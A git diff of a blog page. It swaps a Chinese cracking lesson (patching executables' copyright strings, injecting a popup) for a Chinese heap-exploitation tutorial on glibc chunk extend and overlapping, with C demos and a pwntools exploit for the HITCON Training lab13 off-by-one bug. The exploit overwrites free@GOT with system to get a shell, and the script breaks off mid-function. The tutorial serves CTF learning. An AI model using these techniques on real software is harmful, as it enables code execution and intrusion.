@@ -47,7 +47,7 @@
     
     <title>
         
-            吾爱破解培训第三课：改头换面之修改版权和资源 | 
+            堆溢出-Chunk Extend and Overlapping | 
         
         K&#39;s House
     </title>
@@ -58,7 +58,7 @@
 
     <meta name="format-detection" content="telephone=no">
     <meta name="description" itemprop="description" content="Trust me,Lisa.">
-    <meta name="keywords" content=",逆向,脱壳">
+    <meta name="keywords" content=",Pwn">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -219,7 +219,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="K&#39;s House">
-    <meta name="msapplication-starturl" content="https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/">
+    <meta name="msapplication-starturl" content="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="K&#39;s House">
@@ -234,16 +234,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/">
+    <meta property="og:url" content="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="吾爱破解培训第三课：改头换面之修改版权和资源 | K&#39;s House">
+    <meta property="og:title" content="堆溢出-Chunk Extend and Overlapping | K&#39;s House">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="Trust me,Lisa.">
-    <meta property="og:article:tag" content="逆向"> <meta property="og:article:tag" content="脱壳"> 
+    <meta property="og:article:tag" content="Pwn"> 
 
     
-        <meta property="article:published_time" content="Sun Mar 31 2019 13:59:01 GMT+0800">
-        <meta property="article:modified_time" content="Sat Jul 14 2018 21:06:58 GMT+0800">
+        <meta property="article:published_time" content="Sun Jan 05 2020 18:00:47 GMT+0800">
+        <meta property="article:modified_time" content="Sun Jan 05 2020 18:01:42 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -251,7 +251,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/index.html">
+        <link rel="canonical" href="https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/index.html">
     
 
     <!-- Structured-data for SEO -->
@@ -263,10 +263,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/index.html",
-    "headline": "吾爱破解培训第三课：改头换面之修改版权和资源",
-    "datePublished": "Sun Mar 31 2019 13:59:01 GMT+0800",
-    "dateModified": "Sat Jul 14 2018 21:06:58 GMT+0800",
+    "mainEntityOfPage": "https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/index.html",
+    "headline": "堆溢出-Chunk Extend and Overlapping",
+    "datePublished": "Sun Jan 05 2020 18:00:47 GMT+0800",
+    "dateModified": "Sun Jan 05 2020 18:01:42 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "kabeor",
@@ -284,7 +284,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",逆向,脱壳",
+    "keywords": ",Pwn",
     "description": "Trust me,Lisa.",
 }
 </script>
@@ -376,7 +376,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#吾爱破解培训第三课：改头换面之修改版权和资源"><span class="post-toc-text">吾爱破解培训第三课：改头换面之修改版权和资源</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#给Exe程序添加弹窗"><span class="post-toc-text">给Exe程序添加弹窗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#汉化"><span class="post-toc-text">汉化</span></a></li></ol></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#堆溢出-Chunk-Extend-and-Overlapping"><span class="post-toc-text">堆溢出-Chunk Extend and Overlapping</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#对-inuse-的-fastbin-进行-extend"><span class="post-toc-text">对 inuse 的 fastbin 进行 extend</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#对-inuse-的-smallbin-进行-extend"><span class="post-toc-text">对 inuse 的 smallbin 进行 extend</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#对-free-的-smallbin-进行-extend"><span class="post-toc-text">对 free 的 smallbin 进行 extend</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通过-extend-后向-overlapping"><span class="post-toc-text">通过 extend 后向 overlapping</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通过-extend-前向-overlapping"><span class="post-toc-text">通过 extend 前向 overlapping</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#例-HITCON-Trainging-lab13"><span class="post-toc-text">例 HITCON Trainging lab13</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞点"><span class="post-toc-text">漏洞点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用"><span class="post-toc-text">利用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li></ol></li></ol>
     </ul>
     
 
@@ -393,20 +393,11 @@
                 
     <!-- Paradox Post Header -->
     
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-            <script type="text/ls-javascript" id="post-thumbnail-script">
-    var randomNum = Math.floor(Math.random() * 19 + 1);
-
-    $('.post_thumbnail-random').attr('data-original', '/img/random1/m-' + randomNum + '.png');
-    $('.post_thumbnail-random').addClass('lazy');
-</script>
-
-        
+        <!-- Custom Thumbnail -->
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://i.loli.net/2018/07/16/5b4c6273a0250.png)">
     
             <p class="article-headline-p">
-                吾爱破解培训第三课：改头换面之修改版权和资源
+                堆溢出-Chunk Extend and Overlapping
             </p>
         </div>
 
@@ -424,7 +415,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>kabeor</strong>
-        <span>3月 31, 2019</span>
+        <span>1月 05, 2020</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -448,7 +439,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/脱壳/">脱壳</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/逆向/">逆向</a>
+        <a class="post_tag-link" href="/tags/Pwn/">Pwn</a>
     </ul>
     
 
@@ -502,15 +493,52 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h1 id="吾爱破解培训第三课：改头换面之修改版权和资源"><a href="#吾爱破解培训第三课：改头换面之修改版权和资源" class="headerlink" title="吾爱破解培训第三课：改头换面之修改版权和资源"></a>吾爱破解培训第三课：改头换面之修改版权和资源</h1><p>1.利用资源编辑器修改版权<br>Restorator<br>ResEdit<br>ResHacker</p>
-<p>2.利用API定位修改版权的地方<br>SetDlgItemTextW/A (DialogBox控件设置文本)</p>
-<p>3.利用十六进制编辑器修改<br>C32Asm<br>Winhex</p>
-<p>操作实例见另一篇笔记<br><a href="http://note.youdao.com/noteshare?id=fac4a494abe9d4e16f1fb4d7e8737498" target="_blank" rel="noopener">对PixtopianBook的破解</a></p>
-<h3 id="给Exe程序添加弹窗"><a href="#给Exe程序添加弹窗" class="headerlink" title="给Exe程序添加弹窗"></a>给Exe程序添加弹窗</h3><p>1.添加MessageBoxA的导入表并获取VA<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MessageBoxA</span><br><span class="line">MessageBoxA  ord:0 rva: 001AA187 VA:005AA187</span><br></pre></td></tr></table></figure></p>
-<p>2.添加一个新的区段，并植入汇编代码(弹窗并跳回原来的EP)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push Style(0)</span><br><span class="line">push Title</span><br><span class="line">push Text</span><br><span class="line">push hOwner(0)</span><br><span class="line">call dword ptr ds:[0x5AA187]</span><br></pre></td></tr></table></figure></p>
-<p>3.修改EP到新的起始位置并保存</p>
-<h3 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h3><p>使用Restorator，注意&amp;加字母表示快捷键 </p>
-<p>From <a href="https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/">https://kabeor.github.io/吾爱破解培训第三课：改头换面之修改版权和资源/</a> bye</p>
+        <h1 id="堆溢出-Chunk-Extend-and-Overlapping"><a href="#堆溢出-Chunk-Extend-and-Overlapping" class="headerlink" title="堆溢出-Chunk Extend and Overlapping"></a>堆溢出-Chunk Extend and Overlapping</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用方法需要以下的时机和条件：</p>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制 chunk header 中的数据</li>
+</ul>
+<p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p>
+<blockquote>
+<p>作用</p>
+</blockquote>
+<p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
+<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p>
+<h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure>
+<p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p>
+<h2 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1     大小 &gt; fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;   <span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure>
+<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
+<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容。</p>
+<h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure>
+<p>首先释放 chunk1 使它进入 unsorted bin 中，然后篡改 chunk1 的 size 域，此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p>
+<h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>malloc(0x10)申请的都是fastbin。</p>
+<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
+<h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
+<h2 id="例-HITCON-Trainging-lab13"><a href="#例-HITCON-Trainging-lab13" class="headerlink" title="例 HITCON Trainging lab13"></a>例 HITCON Trainging lab13</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          Heap Creator          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Show a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 5. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">( heaparray[v1] )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(*(heaparray[v1] + <span class="number">1</span>), *heaparray[v1] + <span class="number">1L</span>L);   <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
+<li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
+<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>break *0x400D76</p>
+<p>创建两个大小为0x14的堆块，heap命令查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603290</span><br><span class="line">0x603290:	0x0000000000000000	0x0000000000000021  ===&gt;chunk1</span><br><span class="line">0x6032a0:	0x0000000000000014	0x00000000006032c0  指向</span><br><span class="line">0x6032b0:	0x0000000000000000	0x0000000000000021  ===&gt;chunk1数据</span><br><span class="line">0x6032c0:	0x6161616161616161	0x6161616161616161  长度0x14</span><br><span class="line">0x6032d0:	0x0000000061616161	0x0000000000000021  ===&gt;chunk2</span><br><span class="line">0x6032e0:	0x0000000000000014	0x0000000000603300</span><br><span class="line">0x6032f0:	0x0000000000000000	0x0000000000000021  ===&gt;chunk2数据</span><br><span class="line">0x603300:	0x6262626262626262	0x6262626262626262  长度0x14</span><br><span class="line">0x603310:	0x0000000062626262	0x0000000000020cf1  ===&gt;top chunk</span><br><span class="line">0x603320:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>因此堆中保存的结构为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------------------</span><br><span class="line">chunk1 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br><span class="line">chunk2 ========&gt; |  prev_size  |  size  |</span><br><span class="line">                 |  len(data)  |  ptr   |</span><br><span class="line">                 |  prev_size  |  size  |</span><br><span class="line">                 |         data         |</span><br><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure>
+<p>可见如果我们数据的长度为0x18，调用edit_heap就可触发off-by-one覆盖下一堆块的prev_size</p>
+<p>一个chunk在被free掉之后存在bins中，其头部含有prev_size和size，但一旦malloc后，这个prev_size就没用了，它只用来记录前一个空闲块的大小。因此如果malloc0x18个字节的话多出8个字节没有对齐，会将这个prev_size也当做data段的部分分配出去，而不是下一个堆了。</p>
+<p>接下来就是利用<strong>通过 extend 后向 overlapping+fastbin</strong>实现利用了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">'aaaa'</span>)<span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment"># chunk1</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'cccc'</span>)<span class="comment"># chunk2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)<span class="comment"># chunk3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x81'</span>)<span class="comment"># 0x18,  off-by-one</span></span><br><span class="line">delete(<span class="number">1</span>)             <span class="comment"># 通过 extend 后向 overlapping</span></span><br><span class="line">size = <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload = <span class="string">'d'</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">'free'</span>])<span class="comment">#这里的size涉及到后面修改地址时需要多长的字节</span></span><br><span class="line">create(<span class="number">0x70</span>,payload) <span class="comment">#重新创建chunk</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(cn.recvuntil(<span class="string">'Done'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))  <span class="comment"># free_got地址</span></span><br><span class="line">success(<span class="string">'free_addr = '</span>+str(hex(free_addr)))</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'free'</span>]  <span class="comment"># system地址</span></span><br><span class="line">success(<span class="string">'system_addr = '</span>+str(hex(system_addr)))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)  <span class="comment"># free执行</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">lib = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(l,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    cn.sendline(str(int(l)))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    <span class="comment">#if index == 2:gdb.attach(cn)</span></span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line">    cn.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line">    cn.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">'Your choice 